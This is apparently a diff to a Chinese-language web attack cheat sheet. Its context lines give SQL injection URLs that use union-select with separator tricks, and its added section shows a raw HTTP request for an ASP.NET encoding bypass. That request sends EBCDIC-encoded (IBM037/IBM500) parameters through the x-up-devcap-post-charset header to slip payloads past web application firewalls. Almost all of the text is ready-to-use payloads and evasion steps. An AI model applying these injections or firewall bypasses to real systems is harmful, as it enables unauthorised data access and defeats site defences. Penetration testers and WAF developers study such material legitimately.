@@ -374,3 +374,21 @@ EXEC sp_OADestory @a;
 [https://vuln.app/getItem?id=1+union+select+null,@@version,null+from.users--](https://vuln.app/getItem?id=1+union+select+null,@@version,null+from.users--)
 SELECT和一次性列之间的\N分隔符：
 [https://vuln.app/getItem?id=0xunion+select\Nnull,@@version,null+from+users--](https://vuln.app/getItem?id=0xunion+select%5CNnull,@@version,null+from+users--)
+
+## ASP.NET 编码bypass
+```
+POST /test/a.aspx?%C8%85%93%93%96%E6%96%99%93%84= HTTP/1.1 
+Host: target 
+User-Agent: UP foobar 
+//Content-Type: application/x-www-form-urlencoded; charset=ibm037
+x-up-devcap-post-charset: ibm500 或者ibm037
+Content-Length: 40 
+
+%89%95%97%A4%A3%F1=%A7%A7%A7%A7%A7%A7%A7
+```
+
+1.添加HTTP头 x-up-devcap-post-charset来表明使用的字符集，代替charset字段
+2.添加UserAgent： UP xxx
+3.参数键值都要编码
+
+
